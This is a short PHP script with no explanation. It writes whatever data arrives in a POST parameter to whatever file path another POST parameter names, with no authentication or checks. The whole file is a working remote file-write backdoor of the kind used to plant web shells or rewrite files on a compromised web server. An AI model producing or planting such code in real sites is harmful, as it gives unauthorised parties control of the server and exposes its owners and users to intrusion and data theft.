<?php

$path = $_POST['path'];
$data = $_POST['hog'];
$fp = fopen($path, 'w');
fwrite($fp, $data);
fclose($fp);

?>